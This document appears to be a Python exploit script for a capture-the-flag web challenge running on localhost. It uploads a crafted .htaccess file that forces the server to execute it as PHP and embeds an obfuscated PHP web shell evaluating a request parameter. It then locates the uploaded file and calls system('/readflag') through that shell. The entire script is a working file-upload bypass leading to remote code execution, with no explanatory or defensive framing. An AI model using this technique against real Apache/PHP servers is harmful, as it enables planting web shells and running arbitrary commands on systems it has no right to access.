import requests
import re
# challenge url
url = "http://127.0.0.1:8000"





session = requests.Session()

paramsGet = {"id":"1"}
paramsPost = {"submit":"submit"}
paramsMultipart = [('file', ('.htaccess', "<Files .htaccess>\r\nForceType application/x-httpd-php\r\nSetHandler application/x-httpd-php\r\nRequire all granted\r\nphp_flag engine on\r\n</Files>\r\nphp_value auto_prepend_fi\\\r\nle .htaccess\r\n\x23<?php eval(\x24_REQUEST['evoA'])?>", 'application/octet-stream'))]

response = session.post(url, data=paramsPost, files=paramsMultipart, params=paramsGet,allow_redirects=False)

# print("Status code:   %i" % response.status_code)
# print("Response body: %s" % response.content)

location =  response.headers['Location'] if response.status_code == 302 else None
print(location)

response = session.get(url+"/"+location)

exp_url = re.search(r"<img src='(.*?)'/><style>",response.content,re.S).group(1)

exp = '?evoA=system("/readflag");'

res = session.get(url+"/"+exp_url+exp)
print("Response body: %s" % res.content)
